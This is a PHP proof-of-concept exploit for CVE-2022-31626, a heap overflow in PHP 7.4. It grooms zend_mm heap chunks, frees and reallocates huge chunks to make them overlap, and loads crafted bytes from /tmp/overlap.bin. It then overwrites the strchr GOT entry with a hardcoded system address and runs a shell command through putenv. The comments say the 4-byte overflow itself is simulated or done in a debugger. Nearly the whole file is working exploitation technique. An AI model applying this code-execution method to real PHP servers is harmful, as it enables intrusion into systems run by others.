<?php

/*
New exploitation method For CVE 2022-31626

This technique uses huge chunk in PHP 7.4.30

We can exploit PHP bug #81719 in PHP 7.4.29.
Bug #81719 is Heap Overflow Bug which allowes to overwrite 4 bytes.
This script demonstrates how to get code execution with overwriting 4 bytes

We will present another techique for this bug in the next article.
*/

$system_addr = 0x7f6eba64a3a0;   //rewrite strchr GOT with system
$str = pack('Q', $system_addr);

$arr = [];
//create chunks for heap alignment
$arr[0] = str_repeat('A', 2 * 1024 * 1024 - 0x1000);
$arr[1] = str_repeat('B', 4 * 1024 * 1024 - 0x1000);
$arr[2] = str_repeat('C', 8 * 1024 * 1024 - 0x1000);
//heap aligned to 0x000000  (three null-bytes in lower address)

//create huge chunk to rewrite the ptr in zend_mm_huge_list metadata structure (of size 24 bytes)
$arr[3] = str_repeat('D', 4 * 1024 * 1024 - 0x1000);

//fill the pages of chunk which was allocated before huge chunk arr[0] 
$arr[4]   = str_repeat('E', 0x1000 * 353);
$arr[123] = str_repeat('Q', 0x1000 * 6);

//in debugger bin 26 is empty always -- so bypass loop
//allocate memory in bin 26 -- new _zend_mm_chunk is created after chunk arr[3] and before chunk arr[6]
for ($i=0; $i < 1; ++$i) {
	$arr[222 + $i] = str_repeat('S', 1792 - 100);
}

//create huge chunk and we will munmap with different size  
$arr[6] = str_repeat('F', 2 * 1024 * 1024 - 0x1000);

unset($arr[3]); 	// free huge chunk arr[3]

//alloc again -- for moving zend_mm_huge_list metadata struct into huge_list head
//chunk arr[7] allocated in same place of chunk arr[3] and with same metadata chunk address
$arr[7] = str_repeat('D', 4 * 1024 * 1024 - 0x1000);

var_dump('');   	//simulate bug
					//need 4 bytes heap overflow OR rewrite in gdb
					//rewrite field "ptr" in zend_mm_huge_list metadata struct for chunk arr[7]

unset($arr[6]);     //huge chunk munmap with size of chunk arr[7] --> overlap

// fill $arr[8] via overlap.bin file
// generate_overlap.py creates overlap.bin  
$arr[8] = file_get_contents('/tmp/overlap.bin');			//overlap chunk 2 -- overwrite bin 26 ptrs

var_dump('');   	//breakpoint stop ---> we can see memory overlapped chunks

//get memory from overlapped bin 26 and return ptr on strchr 
$arr[333] = str_repeat('S', 1792 - 100 - 8);
$arr[333 + 1] = $str. $arr[333]; 

putenv('ls -lia'); // execute command via putenv

?>